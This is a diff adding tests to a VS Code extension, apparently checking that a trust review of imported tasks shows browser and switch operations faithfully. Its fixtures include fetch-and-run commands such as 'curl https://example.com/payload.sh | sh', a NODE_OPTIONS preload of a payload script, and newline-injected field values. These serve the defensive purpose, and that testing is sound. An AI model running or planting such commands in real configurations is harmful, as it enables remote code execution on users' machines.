@@ -658,6 +658,7 @@ suite('Extension Test Suite', () => {
 				['input', { id: 'B', type: 'stringManipulation', function: 'trim', input: '${A.value}' }],
 				['path', { id: 'B', type: 'writeFile', path: '${A.value}', content: 'x' }],
 				['content', { id: 'B', type: 'writeFile', path: 'p', content: '${A.value}' }],
+				['url', { id: 'B', type: 'browser', url: '${A.value}' }],
 				['archive', { id: 'B', type: 'unzip', archive: '${A.value}' }],
 				['items[].label', { id: 'B', type: 'quickPick', items: [{ label: '${A.value}' }] }],
 				['itemsFromCommand', { id: 'B', type: 'quickPick', itemsFromCommand: 'echo ${A.value}' }],
@@ -673,6 +674,14 @@ suite('Extension Test Suite', () => {
 					`${label} 의 의존성이 사라졌다 — 값이 오기 전에 실행된다`
 				);
 			}
+		});
+
+		test('browser target 열거값은 보간·의존성 대상이 아니다', () => {
+			const deps = inferTaskDependencies(
+				{ id: 'B', type: 'browser', url: 'report.html', target: '${A.value}' } as any,
+				new Set(['A', 'B'])
+			);
+			assert.deepStrictEqual([...deps], []);
 		});
 
 		test('의존성 추론도 head 를 다듬지 않는다', () => {
@@ -4252,7 +4261,7 @@ suite('Extension Test Suite', () => {
 		});
 
 		test('returns false for non-interactive task types', () => {
-			const types = ['shell', 'command', 'unzip', 'zip', 'stringManipulation', 'writeFile', 'appendFile'] as const;
+			const types = ['shell', 'command', 'unzip', 'zip', 'stringManipulation', 'writeFile', 'appendFile', 'browser', 'switch'] as const;
 			for (const type of types) {
 				assert.strictEqual(
 					shouldRecordTaskInput({ id: 't', type } as any),
@@ -6083,6 +6092,16 @@ suite('Extension Test Suite', () => {
 			assert.match(describeImportOperation({ type: 'command', command: { windows: 'tool.exe', linux: 'tool' }, args: ['--file', 'a b'], cwd: 'work', env: { NODE_OPTIONS: '--require ./.vscode/payload.js' }, passTheResultToNextTask: true, output: { mode: 'file', filePath: 'out.log' } }, 'en') ?? '', /windows=.*tool\.exe.*args=.*a b.*cwd=.*env=.*NODE_OPTIONS.*payload\.js.*output\.file/);
 			assert.match(describeImportOperation({ type: 'quickPick', itemsFromCommand: 'curl http:\/\/x\/list | sh', cwd: 'work' }) ?? '', /itemsFromCommand=.*curl.*\| sh.*cwd/);
 			assert.match(describeImportOperation({ type: 'writeFile', path: '../result.txt' }) ?? '', /\.\.\/result\.txt/);
+			assert.match(describeImportOperation({ type: 'browser', url: '${report.path}', target: 'integrated', cwd: 'build' }, 'en') ?? '', /url=.*report\.path.*target=integrated.*cwd/);
+			assert.match(describeImportOperation({ type: 'browser', target: 'default' }, 'ko') ?? '', /URL 누락.*target=default/);
+			const switchDescription = describeImportOperation({
+				type: 'switch', cases: {
+					preview: { type: 'browser', url: '${report.path}' },
+				},
+				defaultCase: { type: 'command', command: 'echo fallback' },
+			}, 'en') ?? '';
+			assert.match(switchDescription, /case "preview" \(browser\): url=.*target=integrated/);
+			assert.match(switchDescription, /default \(command\): echo fallback/);
 			assert.match(describeImportOperation({ type: 'zip', archive: 'a.zip', source: ['src'], tool: { linux: 'zip' }, cwd: 'work', env: { PATH: '.vscode/bin' } }, 'en') ?? '', /archive=.*a\.zip.*source=.*src.*tool=.*linux.*cwd=.*env=.*PATH/);
 			assert.match(describeImportOperation({ type: 'unzip', inputs: { archive: 'pick', destination: 'folder' } }, 'en') ?? '', /inputs=.*pick.*folder.*built-in/);
 			assert.match(describeImportOperation({ type: 'unzip', inputs: {} }, 'ko') ?? '', /inputs에서 받음.*내장/);
@@ -6090,6 +6109,90 @@ suite('Extension Test Suite', () => {
 			assert.match(describeImportOperation({ type: 'writeFile' }, 'ko') ?? '', /경로 누락/);
 			assert.match(describeImportOperation({ type: 'zip' }, 'ko') ?? '', /아카이브 누락.*소스 누락.*내장/);
 			assert.match(summarizeImportTrustReview([{ action: { description: 'd', tasks: [] } } as any], 'ko').actionLines[0], /제목 없음/);
+		});
+
+		test('switch 신뢰 검토는 런타임과 같은 상속 필드를 case별로 표시한다', () => {
+			const switchTask = {
+				id: 'selectedWork',
+				type: 'switch',
+				on: 'build',
+				command: 'curl https://example.com/payload.sh | sh',
+				args: ['--outer'],
+				cwd: 'outer-work',
+				env: { NODE_OPTIONS: '--require ./payload.js' },
+				passTheResultToNextTask: true,
+				output: { mode: 'file', filePath: 'outer.log' },
+				cases: {
+					inherited: { type: 'shell' },
+					overridden: { type: 'command', command: 'safe-tool', cwd: 'case-work' },
+				},
+			};
+
+			const lines = (describeImportOperation(switchTask, 'en') ?? '').split('\n');
+			assert.strictEqual(lines.length, 2);
+			assert.match(lines[0], /case "inherited" \(shell\): curl .*payload\.sh \| sh/);
+			assert.match(lines[0], /args=.*--outer.*cwd=.*outer-work.*env=.*NODE_OPTIONS.*output\.file=.*outer\.log/);
+			assert.match(lines[1], /case "overridden" \(command\): safe-tool/);
+			assert.match(lines[1], /args=.*--outer.*cwd=.*case-work.*env=.*NODE_OPTIONS.*output\.file=.*outer\.log/);
+
+			const summary = summarizeImportTrustReview([{
+				id: 'imported', title: 'Imported', action: { description: 'd', tasks: [switchTask] },
+			} as any], 'en');
+			assert.strictEqual(summary.operationLines.length, 2);
+			assert.ok(summary.operationLines.every(line => line.includes('(switch)')));
+		});
+
+		test('switch 신뢰 검토는 뒤 case를 자르지 않고 잘못된 case에도 throw하지 않는다', () => {
+			const cases = Object.fromEntries(Array.from(
+				{ length: IMPORT_TRUST_REVIEW_LIST_LIMIT + 2 },
+				(_, index) => [`branch-${index}`, {
+					type: 'shell',
+					command: index === IMPORT_TRUST_REVIEW_LIST_LIMIT + 1
+						? 'echo LATE_SWITCH_CASE_MARKER'
+						: `echo ${'x'.repeat(240)}`,
+				}]
+			));
+			const task = { id: 'choose', type: 'switch', on: 'x', cases };
+			const description = describeImportOperation(task, 'en') ?? '';
+			assert.ok(description.includes('LATE_SWITCH_CASE_MARKER'));
+			assert.strictEqual(description.split('\n').length, IMPORT_TRUST_REVIEW_LIST_LIMIT + 2);
+
+			const actions = [{
+				id: 'imported', title: 'Imported', action: { description: 'd', tasks: [task] },
+			}] as any;
+			assert.strictEqual(
+				summarizeImportTrustReview(actions, 'en').operationLines.length,
+				IMPORT_TRUST_REVIEW_LIST_LIMIT + 2
+			);
+			assert.ok(buildImportTrustReviewDetail(actions, [], 'en').includes('… and 2 more'));
+
+			let malformedDescription: string | undefined;
+			assert.doesNotThrow(() => {
+				malformedDescription = describeImportOperation({
+					id: 'invalid', type: 'switch', on: 'x', cases: {
+						broken: {
+							type: 'command', command: 'echo malformed',
+							when: { var: 'x', equals: 'x' },
+						},
+						valid: { type: 'command', command: 'echo visible' },
+					},
+				}, 'en');
+			});
+			assert.match(malformedDescription ?? '', /case "broken" \(command\) \[invalid branch\]: echo malformed/);
+			assert.match(malformedDescription ?? '', /case "valid" \(command\): echo visible/);
+
+			const hostileSummary = summarizeImportTrustReview([{
+				id: `action\nCommands and file operations ${'a'.repeat(300)}`,
+				title: `Title\nDoctor ${'b'.repeat(300)}`,
+				action: { description: 'd', tasks: [{
+					id: `task\nActions ${'c'.repeat(300)}`,
+					type: 'command',
+					command: { linux: 'tool', injected: 'echo hidden' },
+				}] },
+			} as any], 'en');
+			assert.ok([...hostileSummary.actionLines, ...hostileSummary.operationLines]
+				.every(line => !line.includes('\n')));
+			assert.ok(!hostileSummary.operationLines.some(line => line.includes('injected=')));
 		});
 
 		test('summarizes nested actions and bounds every review section', () => {
